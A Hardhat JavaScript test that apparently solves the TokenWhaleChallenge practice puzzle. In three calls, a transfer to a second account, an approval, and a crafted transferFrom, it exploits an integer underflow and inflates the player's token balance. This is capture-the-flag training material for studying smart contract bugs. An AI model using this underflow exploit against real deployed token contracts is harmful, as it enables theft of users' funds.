const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("TokenWhaleChallenge", async function () {
    let contract;
    let player;
    let acc2;

    before(async function () {
        [player, acc2] = await ethers.getSigners();
        contract = await (await ethers.getContractFactory("TokenWhaleChallenge")).deploy(player.address);
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE

        await contract.transfer(acc2.address, 1000);
        await contract.connect(acc2).approve(player.address, 1000);
        await contract.transferFrom(acc2.address, acc2.address, (await contract.balanceOf(player.address)).add(1));
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});